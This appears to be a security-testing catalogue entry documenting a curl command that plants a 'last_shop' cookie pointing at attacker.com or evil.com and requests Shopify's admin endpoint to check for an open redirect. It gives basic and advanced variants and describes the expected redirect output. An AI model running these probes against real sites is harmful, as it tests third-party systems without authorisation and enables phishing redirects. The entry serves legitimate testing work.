---
id: cmd-curl-set-cookie-and-visit
data: >-
  curl -c cookies.txt -b "last_shop=https://attacker.com"
  https://www.shopify.com/admin/ -L -v
tags:
  - web
  - cookie
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.467Z'
verified: false
validated: true
submitted: true
---
# curl-set-cookie-and-visit

## Command

```bash
curl -c cookies.txt -b "last_shop=https://attacker.com" https://www.shopify.com/admin/ -L -v
```

## Description

This curl command sets a cookie jar, applies a custom 'last_shop' cookie value, visits the Shopify admin endpoint, follows redirects, and provides verbose output to inspect the open redirect behavior. Use it for testing cookie-based vulnerabilities in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c cookies.txt` | Saves cookies to a file for persistence | Yes |
| `-b "last_shop=https://attacker.com"` | Sets the cookie value (replace with arbitrary domain) | Yes |
| `https://www.shopify.com/admin/` | Target URL to trigger redirect | Yes |
| `-L` | Follows HTTP redirects | Yes |
| `-v` | Verbose mode for detailed headers | No |

## Examples

### Basic Usage

```bash
curl -c cookies.txt -b "last_shop=https://evil.com" https://www.shopify.com/admin/ -L
```

### Advanced Usage

```bash
curl -c cookies.txt -b "last_shop=https://evil.com" -H "User-Agent: Mozilla/5.0" https://www.shopify.com/admin/auth -L -v > output.log
```

## Expected Output

Verbose logs showing cookie set, request headers with the cookie, a 302 redirect to the arbitrary domain, and final response from the attacker site (e.g., 200 OK).

## Related

- [[Related Procedure: Set-Malicious-last-shop-Cookie]]
